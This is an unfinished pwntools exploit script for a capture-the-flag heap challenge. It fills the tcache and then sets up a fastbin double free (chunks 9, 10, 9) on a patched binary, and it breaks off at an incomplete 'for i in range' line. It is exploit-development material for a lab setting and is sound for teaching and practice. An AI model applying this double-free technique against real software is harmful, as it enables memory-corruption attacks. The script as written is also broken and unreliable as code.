#!/usr/bin/python3

from pwn import *

exe = ELF('chal_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('0', 0)
else:
        p = process(exe.path)
cnt = 0
def malloc(size, payload):
        global cnt
        sla(b'> ', b'1')
        sla(b': ', str(size).encode())
        sla(b": ", str(cnt).encode())
        sla(b": ", payload)
        cnt+=1
def free(idx):
        sla(b'> ', b'2')
        sla(b": ", str(idx).encode())        
GDB()
# fake chunk
malloc(0x78, b'wan')
malloc(0x78, b'wan')
for i in range(2, 2+7):
        malloc(0x78, b'wan')
malloc(0x78, b'wan')
malloc(0x78, b'wan')

for i in range(2, 2+7):
        free(i)
free(9)
free(10)
free(9)
for i in range


p.interactive()
